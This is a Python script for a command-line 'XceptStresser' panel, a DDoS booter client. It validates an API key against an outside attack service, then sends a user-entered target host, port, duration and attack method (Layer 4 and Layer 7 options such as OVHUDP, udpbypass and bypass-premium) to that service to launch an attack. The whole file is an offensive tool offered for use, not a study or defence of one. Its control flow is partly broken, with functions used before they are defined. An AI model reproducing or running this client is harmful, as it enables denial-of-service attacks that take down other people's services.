from colorama import Fore,init
init(convert=True)
import requests,os
import pyfiglet,time
import requests
import json
os.system('title XceptStresser - Support : quartz#3333')
def cls():
    linux = "clear"
    windows = "cls"
    os.system([linux,windows][os.name=="nt"])

def bannerz():
    banner = pyfiglet.figlet_format("XCEPTSTRESSER")
    print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
    print(Fore.RED+"       Welcome to XceptStresser Panel!! | Total Servers: 1"+Fore.RESET)
banner = pyfiglet.figlet_format("XCEPTSTRESSER")
print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
print(Fore.RED+"       Welcome to XceptStresser Panel!! | Total Servers: 1"+Fore.RESET)

def userin():
    print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
    print(Fore.RED+"       Welcome to XceptStresser Panel!! | Total Servers: 1"+Fore.RESET)
    print(Fore.LIGHTCYAN_EX+"                 [1] Check Available Attack Methods"+Fore.RESET)
    print(Fore.LIGHTCYAN_EX+"                 [2] Launch An Attack"+Fore.RESET)
    while True:
        action = input(Fore.MAGENTA+"I want to [>] "+Fore.RESET)
        if action:
            break
    if action == '1':
        methods()
        inp = input(Fore.LIGHTBLUE_EX+"\n Press Any Key to Continue"+Fore.RESET)
        bannerz()
        userin()
    elif action == '2':
        pass
        cls()
        # while True:
        #     ip = input(Fore.LIGHTCYAN_EX+"Enter The Hostname/IP [>]  "+Fore.RESET)
        #     port = input(Fore.LIGHTCYAN_EX+"Enter The Port  [>]  "+Fore.RESET)
        #     time_val= input(Fore.LIGHTCYAN_EX+"Enter The Timeout in Seconds [>]  "+Fore.RESET)
        #     attack_methd = input(Fore.LIGHTCYAN_EX+"Enter The Attack Method [>]  "+Fore.RESET)
        #     if ip:
        #         break
        #     if port:
        #         break
        #     if time_val:
        #         break
        #     if attack_methd:
        #         break
        print(Fore.RED+"\n Attack Started!"+Fore.RESET)
        r = requests.get(f"https://api.inverse.best?token="+str(api_key) +"&host="+str(ip)+"&port="+port+"&time="+str(time_val)+"&method="+str(attack_methd))
        r = r.text
        lax = '<body background="white">'
        if lax in r:
            saysplit = r.split(lax,1)
            print(Fore.GREEN+saysplit[1]+Fore.RESET)
        time.sleep(2)
        userin()
while True:
    api_key = input(Fore.LIGHTBLUE_EX+"Enter Your API Key [>] "+Fore.RESET)

    response = requests.get('https://api.inverse.best?token=' + api_key, headers={'Authorization': api_key})

    if response.status_code == 200:
        response_json = json.loads(response.content)

        if "message" in response_json and response_json["message"] == "Invalid method.":
            print("API Key is valid")
            break
        else:
            print("API Key is invalid. Please enter a valid API Key.")
    else:
        print("API Key is invalid. Please enter a valid API Key.")
print(Fore.MAGENTA+"Succefully Logged in!"+Fore.RESET)

time.sleep(1)
cls()
print(Fore.LIGHTMAGENTA_EX+(banner)+Fore.RESET)
print(Fore.RED+"       Welcome to XceptStresser Panel!! | Total Servers: 1"+Fore.RESET)
print(Fore.LIGHTCYAN_EX+"                 [1] Check Available Attack Methods"+Fore.RESET)
print(Fore.LIGHTCYAN_EX+"                 [2] Launch An Attack"+Fore.RESET)
while True:
    action = input(Fore.MAGENTA+"I want to [>] "+Fore.RESET)
    if action:
        break
def methods():
    cls()
    bannerz()
    print("\n")
    print(Fore.WHITE+"Layer 4 Methods:       [1] DNS [2] udpbypass [3] OVHUDP [4] FIVEM [5] socket [6] OVHTCP"+Fore.RESET)
    print(Fore.WHITE+"Layer 7 Methods :      [1] HTTP-RAW [2] https-premium [3] browser [4] TLSV2 [5] HTTPSOCKET [6] bypass-premium"+Fore.RESET)

if action == '1':
    methods()
    inp = input(Fore.LIGHTBLUE_EX+"\n Press Any Key to Continue..."+Fore.RESET)
    cls()
    # bannerz()
    userin()
elif action == '2':
    pass
    while True:
        ip = input(Fore.LIGHTCYAN_EX+"Enter The Hostname/IP [>]  "+Fore.RESET)
        if ip:
            break
    while True:
        port = input(Fore.LIGHTCYAN_EX+"Enter The Port  [>]  "+Fore.RESET)
        if port:
            break
    while True:
        time_val= input(Fore.LIGHTCYAN_EX+"Enter The Timeout in Seconds [>]  "+Fore.RESET)
        if time_val:
            break
    while True:
        attack_methd = input(Fore.LIGHTCYAN_EX+"Enter The Attack Method [>]  "+Fore.RESET)
        if attack_methd:
            break

    print(Fore.RED+"\n Starting The Attack!"+Fore.RESET)
    r = requests.get(f"https://api.inverse.best?token="+str(api_key) +"&host="+str(ip)+"&port="+port+"&time="+str(time_val)+"&method="+str(attack_methd))
    r = r.text
    lax = '<body background="white">'
    if lax in r:

        saysplit = r.split(lax,1)
        print(Fore.GREEN+saysplit[1]+Fore.RESET) 
    time.sleep(2)
    userin()